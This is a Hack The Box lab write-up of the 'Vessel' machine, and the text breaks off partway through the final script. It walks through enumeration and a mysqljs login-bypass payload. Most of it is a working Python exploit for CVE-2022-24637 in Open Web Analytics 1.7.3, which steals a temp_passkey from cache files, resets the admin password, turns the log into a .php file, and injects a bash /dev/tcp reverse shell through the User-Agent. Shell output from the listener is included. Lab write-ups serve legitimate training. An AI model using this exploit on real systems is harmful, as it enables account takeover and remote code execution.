---
layout: single
title: Vessel - Hack The Box
excerpt: "Vessel is a hard-rated Linux machine from Hack The Box. I really really liked this box, it was straight to the point and not any real rabbit holes. The path to both user and root was easily identified, however getting there took a lot of research and some time spent bashing the head on the keyboard. There are scripting parts needed to complete this box, something that I am not very good at, but it was simple enough for even me to enjoy it. I was introduced to a few new tools and techniques, and learned a lot. This is an amazing box, I would recommend it to anyone that enjoys scripting or would like to learn."
date: 2022-09-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-vessel/vessel_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
  unreleased: true
categories:
  - hackthebox
tags:  
  - linux
  - hard
  - nodejs
  - sqli
  - openwebanalytics
  - python
  - pyinstxtractor
  - uncompyle6
  - pinns
  - runc
---

![](/assets/images/htb-writeup-vessel/vessel_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

Vessel is a hard-rated Linux machine from Hack The Box. I really really liked this box, it was straight to the point and not any real rabbit holes. The path to both user and root was easily identified, however getting there took a lot of research and some time spent bashing the head on the keyboard. There are scripting parts needed to complete this box, something that I am not very good at, but it was simple enough for even me to enjoy it. I was introduced to a few new tools and techniques, and learned a lot. This is an amazing box, I would recommend it to anyone that enjoys scripting or would like to learn.


----------------

# USER
### Step 1
```bash
➜  vessel nmap -Pn -n -p- 10.10.11.178
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 09:37 CEST
Nmap scan report for 10.10.11.178
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

➜  vessel nmap -Pn -n -sCV -p22,80 10.10.11.178
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA)
|   256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA)
|_  256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vessel
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**dirb:**
```bash
➜  vessel dirb http://10.10.11.178

START_TIME: Mon Aug 29 09:39:29 2022
URL_BASE: http://10.10.11.178/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.11.178/ ----
+ http://10.10.11.178/401 (CODE:200|SIZE:2400)                                                                                                               
+ http://10.10.11.178/404 (CODE:200|SIZE:2393)                                                                                                               
+ http://10.10.11.178/500 (CODE:200|SIZE:2335)                                                                                                               
+ http://10.10.11.178/admin (CODE:302|SIZE:28)                                                                                                               
+ http://10.10.11.178/Admin (CODE:302|SIZE:28)                                                                                                               
+ http://10.10.11.178/ADMIN (CODE:302|SIZE:28)                                                                                                               
+ http://10.10.11.178/charts (CODE:302|SIZE:26)                                                                                                              
+ http://10.10.11.178/css (CODE:301|SIZE:173)                                                                                                                
+ http://10.10.11.178/dev (CODE:301|SIZE:173)                                                                                                                
+ http://10.10.11.178/img (CODE:301|SIZE:173)                                                                                                                
+ http://10.10.11.178/js (CODE:301|SIZE:171)                                                                                                                 
+ http://10.10.11.178/login (CODE:200|SIZE:4213)                                                                                                             
+ http://10.10.11.178/Login (CODE:200|SIZE:4213)                                                                                                             
+ http://10.10.11.178/logout (CODE:302|SIZE:28)                                                                                                              
+ http://10.10.11.178/register (CODE:200|SIZE:5830)                                                                                                          
+ http://10.10.11.178/server-status (CODE:403|SIZE:277)  
```

```bash
➜  webanalyze ./webanalyze -host http://vessel.htb
http://vessel.htb (0.2s):
    Apache, 2.4.41 (Web servers)
    Ubuntu,  (Operating systems)
    Google Font API,  (Font scripts)
    Lightbox,  (JavaScript libraries)
    Express,  (Web frameworks, Web servers)
    Node.js,  (Programming languages)
```

```bash
➜  vessel ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://vessel.htb -H "Host: FUZZ.vessel.htb" -fw 5599
N/A
```

Visiting port 80 we find `vessel.htb` in the footer, add it to `/etc/hosts`. 

Trying to create an account we get the response _"Currently not available!"_, and looking in the HTTP POST the body is empty. 

![[/assets/images/htb-writeup-vessel/vessel01.png]]

![[/assets/images/htb-writeup-vessel/vessel02.png]]

Same thing goes for the Password Recovery function - _"Currently not available!"_ and no data in the POST body.

![[/assets/images/htb-writeup-vessel/vessel03.png]]

![[/assets/images/htb-writeup-vessel/vessel04.png]]

Changing focus to the login function. Testing different SQL Injection payloads we get the response _"Wrong credentials! Try Again!"_ several times, example:
```bash
Request: username=admin' or '1'='1'#&password=pass'
Respone: Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!

Request: username=admin" or "1"="1"/*&password=pass'
Response: Wrong credentials! Try Again!,Wrong credentials! Try Again!,Wrong credentials! Try Again!

Request: username=admin" or "1"="1"--&password=pass'
Response:Wrong credentials! Try Again!,Wrong credentials! Try Again!
```

Googling about nodejs sql injection I come across [this post](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) explaining a authentication bypass technique. 
**TLDR;**
```bash
username=admin&password[password]=1
```
Will bypass authentication and generate a admin cookie. 

![[/assets/images/htb-writeup-vessel/vessel05.png]]

Add the cookie to your local storage and browse to http://vessel.htb/admin and continue enumerating. 

Pressing `Analytics` from the drop down bar in the top right corener forwards us to `openwebanalytics.vessel.htb` - add it to `/etc/hosts`
![[/assets/images/htb-writeup-vessel/vessel06.png]]


### Step 2

```bash
➜  vessel ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://openwebanalytics.vessel.htb/FUZZ -b "connect.sid=s%3AHesPODZMoKvc6J1HoyB3bOrgfQ94Oist.EJSYnEx%2Bzt9qCM4jC0sFUQiTfiZEWZf0AkfHELtFuaI" -fs 26
.htaccess               [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 3231ms]
.htpasswd               [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 3567ms]
api                     [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 28ms]
conf                    [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 33ms]
includes                [Status: 301, Size: 345, Words: 20, Lines: 10, Duration: 34ms]
modules                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 28ms]
plugins                 [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 29ms]
server-status           [Status: 403, Size: 292, Words: 20, Lines: 10, Duration: 30ms]
vendor                  [Status: 301, Size: 343, Words: 20, Lines: 10, Duration: 33ms]
```

Looking on the source code we see that it's running **version 1.7.3**:
```bash
<LINK REL=StyleSheet HREF="http://openwebanalytics.vessel.htb/modules/base/css/owa.css?version=1.7.3" TYPE="text/css">
```

Reading about version 1.7.3 I come across [this post](https://devel0pment.de/?p=2494) covering CVE-2022-24637 where use of single quotes cause sensitive information to be printed in the php cache file. 
The cache files are stored here: ``http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/``

And when no cache file is present we see this empty directory:
![[/assets/images/htb-writeup-vessel/vessel07.png]]
A cache file is generated once a user logs in to the application, and at the same time ``index.php`` is also generated to hide the files in the directory. We can generate cache files by doing invalid logins, however since `index.php` is created all we see is a blank page. We need to find a way to calculate the name of the cache file, and luckily it is quiet simple.

Here's a short script I made to calculate the file name, and do a GET request to capture the base64 encoded data
```python
#!/usr/bin/env python3
from hashlib import md5
import requests

user_id = 1
while (user_id < 10):
    unhashed_key = "user_id" + str(user_id)
    cache_filename = md5(unhashed_key.encode()).hexdigest() + ".php"
    url = "http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/" + cache_filename

    print(user_id, "=", url)

    r = requests.session().get(url)
    if r.status_code != 404:
        print(r.content)
        break
    user_id = user_id + 1
```

Running the script returns:
```bash
➜  vessel ./get-cache-file.py 
1 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php
2 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/ee140b966fcc6e58868032d658ae518e.php
3 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/333a7b2c4fe7e6a9e1028a51df3816d3.php
4 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/761b16cfc8c4c438b5cd6974f3313b91.php
5 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/277eabec41d80d89bc280c5b88ca18a8.php
6 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/f00dc1ccf8f0214684cd1b3722648bfd.php
7 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/8c43aebbdb615fce9c93df72bb956116.php
8 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/39e2305c9e511e28167c2b8644daf256.php
9 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/40f0efb1108be4366e279bb71efbed16.php
```

However, as mentioned earlier, if we do a invalid login as user **admin** and run the script again, we'll get the secret base64 data.
```bash
➜  vessel ./get-cache-file.py
1 = http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php
b'<?php\\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJG0wTDdwbVhiS054dlJWcUpIR1dKWS40a3ZxM0hsaEhjYlZoakFxRGt6b1pjVnUvc3c0UENXIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiJjYzI1YzYzOWY0Mzk1MTA5ZTAzODE3ODRiN2VjODQwZSI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\\n?>'

➜  vessel echo "Tzo [... snip ...] Tjt9" | base64 -d
O:8:"owa_user":5:{s:4:"name";s:9:"base.user";s:10:"properties";a:10:{s:2:"id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:1:"1";s:9:"data_type";s:6:"SERIAL";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:1;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:8:"password";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:60:"$2y$10$m0L7pmXbKNxvRVqJHGWJY.4kvq3HlhHcbVhjAqDkzoZcVu/sw4PCW";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:4:"role";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:9:"real_name";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:13:"default admin";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"email_address";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:16:"admin@vessel.htb";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"cc25c639f4395109e0381784b7ec840e";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:13:"creation_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:16:"last_update_date";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:10:"1650211659";s:9:"data_type";s:6:"BIGINT";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}s:7:"api_key";O:12:"owa_dbColumn":11:{s:4:"name";s:7:"api_key";s:5:"value";s:32:"a390cc0247ecada9a2b8d2338b9ca6d2";s:9:"data_type";s:12:"VARCHAR(255)";s:11:"foreign_key";N;s:14:"is_primary_key";b:0;s:14:"auto_increment";b:0;s:9:"is_unique";b:0;s:11:"is_not_null";b:0;s:5:"label";N;s:5:"index";N;s:13:"default_value";N;}}s:16:"_tableProperties";a:4:{s:5:"alias";s:4:"user";s:4:"name";s:8:"owa_user";s:9:"cacheable";b:1;s:23:"cache_expiration_period";i:604800;}s:12:"wasPersisted";b:1;s:5:"cache";N;}% 
```

As stated in the blog post, it's the **temp_passkey** ``cc25c639f4395109e0381784b7ec840e`` that can be userd to set a new password for the admin account. 

### Step 3
Keep building on the script with the blog post as reference and I'm easily able to decode the base64 blob, capture the `temp_passkey` value and change the password for user admin. 
```bash
➜  vessel python3 vessel.py -t http://openwebanalytics.vessel.htb -u admin -p exploit.se
[+] generationg cache file
[+] admin cache found!
[+] extracted temp_passkey: 30e22a1a269d2a65534054bda6ea971b
[+] changed admin password to: exploit.se
[+] admin login successful
```

We're now able to login to the service using `admin:exploit.se` and within we find the directory path:
![[/assets/images/htb-writeup-vessel/vessel08.png]]

Testing to update a value from "On" to "Off" we se all variables used in the POST request:
```html
POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
Host: openwebanalytics.vessel.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 772
Origin: http://openwebanalytics.vessel.htb
Connection: close
Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral
Cookie: owa_passwordSession=c825d3ad67e8ba16dc4f57ddd662a2d296801b6e67017ad76e85350e1ed5ff62; owa_userSession=admin; owa_userSession=admin; owa_passwordSession=49639afc7e742a04d65be47b4eb2ddc2cf0ecb181eddd4151f37e117e280c750
Upgrade-Insecure-Requests: 1

owa_config%5Bbase.resolve_hosts%5D=0&owa_config%5Bbase.log_feedreaders%5D=1&owa_config%5Bbase.log_robots%5D=0&owa_config%5Bbase.log_named_users%5D=1&owa_config%5Bbase.excluded_ips%5D=%2C&owa_config%5Bbase.anonymize_ips%5D=0&owa_config%5Bbase.fetch_refering_page_info%5D=1&owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&owa_config%5Bbase.query_string_filters%5D=%2C&owa_config%5Bbase.announce_visitors%5D=0&owa_config%5Bbase.notice_email%5D=admin%40vessel.htb&owa_config%5Bbase.geolocation_lookup%5D=1&owa_config%5Bbase.track_feed_links%5D=1&owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&owa_nonce=ac9b9a2272&owa_action=base.optionsUpdate&owa_module=base
```

To update the log settings we need to figure out how to dynamically get the `owa_nonce` value and path to log directory. Luckily this is just as easy as doing a GET request:
```python
def updateLog(target):
    # Update log to prepare for malicious payload
    url = target + "/index.php?owa_do=base.optionsGeneral"
    get_data = r.get(url).text
    nonce = re.search(r'\"owa_nonce\" value\=\"(.*?)\"\>', get_data).group(1)
    log_dir = re.search(r'\"owa_config\[base.async_log_dir\]\" value\=\"(.*?)\"\>', get_data).group(1) 
    print("[+] extracted nonce:", nonce)
    print("[+] extracted log_dir:", log_dir)
```

```bash
➜  vessel python3 vessel.py -t http://openwebanalytics.vessel.htb -u admin -p asdf123
[... snip ...]
[+] extracted nonce: ac9b9a2272
[+] extracted log_dir: /var/www/html/owa/owa-data/logs/
```


### Step 4
We can now change the log level and log file to `.php`, to and from here be able to do a log injection to execute php code and get a reverse shell.

The log injection is executed through the ``User Agent`` as we controll this variable and can easily verify that it's reflected:
```bash
➜  vessel curl http://openwebanalytics.vessel.htb/owa-data/logs/rev.php
[... snip ...]
[debug_log] Request URL:GET / 06:08:36 2022-08-30 3856 
[debug_log] User Agent: ASDF THIS IS A TEST AGENT 06:08:36 2022-08-30 3856 
[debug_log] Host: openwebanalytics.vessel.htb 06:08:36 2022-08-30 3856
```


```bash
➜  vessel python3 cve-2022-24637.py -t http://openwebanalytics.vessel.htb -u admin -p exploit.se

   ______     _______     ____   ___ ____  ____      ____  _  _    __  __________ 
  / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ \| || |  / /_|___ /___  |
 | |    \ \ / /|  _| _____ __) | | | |__) | __) |____ __) | || |_| '_ \ |_ \  / / 
 | |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/|__   _| (_) |__) |/ /  
  \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|  |_|  \___/____//_/   
							by 0xPThree - exploit.se


[>] PART 1: SINGLE / DOUBLE QUOTE CONFUSION
[+] generationg cache file
[+] admin cache found!
[+] extracted temp_passkey: 19f5058761ee001e3addb0d3ad400da8
[+] changed admin password to: exploit.se
[+] admin login successful

[>] PART 2: PHP FILE WRITE
[+] extracted nonce: 6d6ed4fecf
[+] extracted log_dir: /var/www/html/owa/owa-data/logs/
[+] updated log settings
[+] wrote payload to file: http://openwebanalytics.vessel.htb/owa-data/logs/rev.php
[>] triggering payload


➜  vessel nc -lvnp 4488                                                              
listening on [any] 4488 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.178] 49452
bash: cannot set terminal process group (1005): Inappropriate ioctl for device
bash: no job control in this shell
www-data@vessel:/var/www/html/owa/owa-data/logs$ id && hostname
id && hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
vessel
```

Full script here:
```python
#!/usr/bin/env python3
# by 0xPThree - exploit.se
# based on https://devel0pment.de/?p=2494
from hashlib import md5
from colorama import Fore
import requests
import argparse
import re
import base64

r = requests.session()

def owaLogin(target, username, password):
    # Login to create cache file or get admin session
    url = target + "/index.php?owa_do=base.loginForm"
    payload = {
        "owa_user_id": username,
        "owa_password": password,
        "owa_go": target,
        "owa_action": "base.login",
        "owa_submit_btn": "Login"
    }
    req = r.post(url, data=payload)
    if "Login Failed!" in req.text:
        print(Fore.GREEN + "[+] generationg cache file")
    else:
        print(Fore.GREEN + "[+]", username, "login successful")


def getTempPassKey(target):
    # Calculate cache file name
    user_id = 1
    while (user_id < 10):
        unhashed_key = 'user_id' + str(user_id)
        cache_filename = md5(unhashed_key.encode()).hexdigest() + '.php'
        url = target + '/owa-data/caches/1/owa_user/' + cache_filename

        req = r.get(url)
        if req.status_code != 404:
            print("[+] admin cache found!")
            cache_content = req.text
            b64_blob = re.search(r'\*(.*?)\*', cache_content).group(1)
            byte_serialized_php = base64.b64decode(b64_blob)
            keys = re.findall("[a-f0-9]{32}", byte_serialized_php.decode('utf-8'))
            print("[+] extracted temp_passkey:", keys[0])
            return(keys[0])
        user_id = user_id + 1


def changePw(target, temp_passkey, password):
    # Change admin password
    url = target + "/index.php?owa_do=base.usersChangePassword"
    payload = {
        "owa_password": password,
        "owa_password2": password,
        "owa_k": temp_passkey,
        "owa_action": "base.usersChangePassword",
        "owa_submit_btn": "Save+Your+New+Password"
    }
    req = r.post(url, data=payload)
    print("[+] changed admin password to:", password)


def updateLog(target):
    # Update log to prepare for malicious payload
    url = target + "/index.php?owa_do=base.optionsGeneral"
    get_data = r.get(url).text
    nonce = re.search(r'\"owa_nonce\" value\=\"(.*?)\"\>', get_data).group(1)
    log_dir = re.search(r'\"owa_config\[base.async_log_dir\]\" value\=\"(.*?)\"\>', get_data).group(1) 
    print(Fore.GREEN + "[+] extracted nonce:", nonce)
    print("[+] extracted log_dir:", log_dir)

    payload = {
        "owa_config[base.error_log_level]": "2",
        "owa_config[base.error_log_file]": log_dir + "rev.php",
        "owa_nonce": nonce,
        "owa_action": "base.optionsUpdate",
        "owa_module": "base"
    }
    r.post(url, data=payload)
    print("[+] updated log settings")
    return(log_dir)


def getReverse(target, log_dir):
    url_end = re.search(r'/var/www/html/owa(.*)', log_dir).group(1) + "rev.php"
    rce_url = target + url_end
    reverse = """<?php system("bash -c 'exec bash -i &>/dev/tcp/10.10.14.4/4488 <&1'"); ?>"""   # change this

    # write payload to log
    r.get(target, headers={"User-Agent": reverse})
    print("[+] wrote payload to file:", rce_url)

    # trigger payload
    print(Fore.CYAN + "[>] triggering payload")
    r.get(rce_url).text


def printArt():
    print(Fore.RED + "")
    print("   ______     _______     ____   ___ ____  ____      ____  _  _    __  __________ ")
